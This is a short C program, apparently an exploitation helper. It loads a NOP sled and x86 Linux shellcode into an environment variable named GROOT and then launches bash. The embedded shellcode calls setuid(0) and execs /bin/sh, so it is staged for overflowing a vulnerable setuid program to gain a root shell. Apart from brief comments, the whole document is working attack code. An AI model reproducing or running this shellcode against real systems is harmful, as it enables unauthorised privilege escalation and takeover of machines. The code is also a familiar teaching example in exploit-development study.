/* Loading shellcode in environment variables. The variable here is GROOT */

#include <unistd.h>
#define NOP 0x90

char shellcode[] =

"\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55"
"\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80"
"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e"
"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50"
"\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

int main(void)
{
    char shell[512];
    puts("Grootshell loaded into environment.\n");
    memset(shell,NOP,512);     /* fill-up the buffer with NOP */

/* fill-up the shellcode on the second half to the end of buffer */
    memcpy(&shell[512-strlen(shellcode)],shellcode,strlen(shellcode));

/* set the environment variable to */
/* GROOT and shell as its value, rewrite if needed */
    setenv("GROOT", shell, 1);

/* modify the variable */
    putenv(shell);

/* invoke the bash */
    system("bash");
    return 0;

}
